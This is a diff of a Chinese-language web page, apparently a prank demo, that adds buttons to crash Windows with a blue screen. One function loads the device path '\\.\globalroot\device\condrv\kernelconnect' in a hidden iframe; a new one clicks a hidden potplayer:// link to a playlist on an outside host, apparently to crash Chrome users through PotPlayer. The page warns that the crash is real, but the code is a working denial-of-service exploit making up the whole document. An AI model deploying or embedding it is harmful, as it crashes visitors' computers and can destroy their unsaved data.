@@ -10,19 +10,21 @@
     <H2>蓝屏是真的,请保存好数据再作死!!!</H2>
     <H4>琴梨梨出品 Github@qinlili23333欢迎提PR</H4>
     <br>
-    <button onclick="makeBSOD();">制造蓝屏</button>
+    <button onclick="makeBSOD();">制造蓝屏(Firefox/旧EDGE/IE)</button>
+    <button onclick="makeBSODm3u8();">制造蓝屏(Chrome系,使用PotPlayer)</button>
     <iframe id="BSODframe" style="display:none;"></iframe>
     <script>
         function makeBSOD(){
-            if(!navigator.userAgent.indexOf("Chrom")){
-                //在edge和firefox上可用
-                document.getElementById("BSODframe").src="file:///\\.\\globalroot\\device\\condrv\\kernelconnect"
-            }
-            else
-            {
-                //解决chrome不允许访问本地文件
-                window.location.href="file:///\\.\\globalroot\\device\\condrv\\kernelconnect"
-            }
+            //在edge和firefox上可用
+            document.getElementById("BSODframe").src="file:///\\.\\globalroot\\device\\condrv\\kernelconnect"
+        }
+        function makeBSODm3u8(){
+            //借助PotPlayer实现
+            var a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = "potplayer://https://bsod.qinlili.bid/playlist.m3u8";
+            document.body.appendChild(a);
+            a.click();
         }
     </script>
 </body>
